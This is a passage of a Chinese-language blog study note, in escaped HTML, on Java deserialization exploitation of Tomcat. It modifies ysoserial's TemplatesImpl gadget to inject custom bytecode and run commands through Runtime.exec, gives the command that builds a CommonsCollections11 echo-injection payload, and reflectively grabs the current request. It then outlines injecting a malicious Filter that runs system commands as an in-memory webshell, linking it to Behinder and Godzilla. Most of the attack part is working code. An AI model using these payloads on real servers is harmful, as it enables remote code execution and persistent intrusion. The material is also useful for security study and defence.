&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">DTMAxisIterator&lt;/span> &lt;span style="color:#111">iterator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译后生成TomcatEchoInject.class字节码，我们继续稍稍改造一下createsTemplatesImpl（上一个Part里是直接粘了恶意代码然后调用createsTemplatesImpl，这里我们已经单独生成了class）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">createTemplatesImpl&lt;/span> &lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">createTemplatesImpl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">createTemplatesImpl&lt;/span> &lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#111">Boolean&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">parseBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;properXalan&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;false&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">createTemplatesImpl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.xalan.xsltc.trax.TemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">createTemplatesImpl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">AbstractTranslet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">T&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">T&lt;/span> &lt;span style="color:#75af00">createTemplatesImpl&lt;/span> &lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">T&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">tplClass&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">abstTranslet&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">transFactory&lt;/span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">T&lt;/span> &lt;span style="color:#111">templates&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tplClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">classBytes&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// use template gadget class
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span> &lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insertClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">StubTransletPayload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insertClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">abstTranslet&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">clazz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">StubTransletPayload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// run command in static initializer
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;java.lang.Runtime.getRuntime().exec(\&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">replaceAll&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\\\\&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;\\\\\\\\&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">replaceAll&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;\\\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;\&amp;#34;);&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">clazz&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">makeClassInitializer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">insertAfter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">clazz&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ysoserial.Pwner&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nanoTime&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">superC&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">abstTranslet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">clazz&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSuperclass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">superC&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">classBytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">clazz&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">classBytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassFiles&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">classAsBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// inject class bytes into instance
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">classBytes&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassFiles&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">classAsBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// required to make TemplatesImpl happy
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Pwnr&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们根据需求增加了接收对应参数的createsTemplatesImpl（接收class，直接转为字节数组并放入TemplatesImpl的_bytescodes字段中）&lt;/p>
&lt;p>修改完Gadgets我们还要修改对应的payload，在调用Gadgets的地方修改为&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">templates&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Gadgets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createTemplatesImpl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">TomcatEchoInject&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们这里直接将command忽略了，还需要再把GeneratePayload修改一下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printUsage&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">exit&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">USAGE_CODE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatEchoInject &amp;gt; ./test.ser
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用这个命令生成的反序列化内容攻击之后还不能上马，只是可以获得request和response对象&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">org&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">apache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">catalina&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">core&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ApplicationFilterChain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;lastServicedRequest&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ThreadLocal&lt;/span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 不为空则意味着第一次反序列化的准备工作已成功
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span> &lt;span style="color:#111">servletRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后就是动态注入Filter，常规的八股是这样的：&lt;/p>
&lt;ol>
&lt;li>通过反射，从request对象中获取Tomcat中控制Web应用的Context对象（StandardContext对象）&lt;/li>
&lt;li>利用获取的StandardContext对象获取上下文中的filterConfigs对象&lt;/li>
&lt;li>注册一个Filter对象并重写其doFilter方法，在其中执行系统命令并通过response返回&lt;/li>
&lt;li>创建FilterDef对象并利用刚创建的Filter对象完成初始化，并新建一个FilterMap对象，为创建的FilterDef对象添加URL映射&lt;/li>
&lt;li>利用创建的FilterConfig对象，并使用刚创建的FilterDef对象初始化，最后加入FilterConfigs中，等待filterChain.doFilter调用&lt;/li>
&lt;/ol>
&lt;p>这里差不多，但是三梦师傅用了一个比较曲折的方法（不过也是反射 通过修改state值来添加filter），这块更多的就不详细说了，在&lt;a href="https://amiaaaz.github.io/2022/05/30/java-study-notes-05/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">上一篇笔记&lt;/a>里以cc11为例详细写了如何接入冰蝎和哥斯拉&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="http://www.hackdig.com/?01/hack-146.htm">Linux 系统文件描述符继承带来的危害&lt;/a> | &lt;a href="http://www.phpweblog.net/GaRY/archive/2011/10/09/PHP_Port_Reuse_With_Apache_FD.html">PHP端口复用的利用&lt;/a> (&lt;a href="https://gist.github.com/wofeiwo/66d7e227caa66e448419">code&lt;/a>)&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/cute/archive/2011/04/20/2022280.html">深入理解linux系统下proc文件系统内容&lt;/a> | &lt;a href="https://www.cnblogs.com/mickole/p/3186441.html">linux系统编程之进程（三）：进程复制fork，孤儿进程，僵尸进程 &lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.00theway.org/2020/01/17/java-god-s-eye/">通杀漏洞利用回显方法-linux平台&lt;/a> | &lt;a href="https://xz.aliyun.com/t/7307">linux下java反序列化通杀回显方法的低配版实现&lt;/a> | &lt;a href="http://www.foreversong.cn/archives/1459">Linux下文件描述符回显构造&lt;/a>&lt;/p>
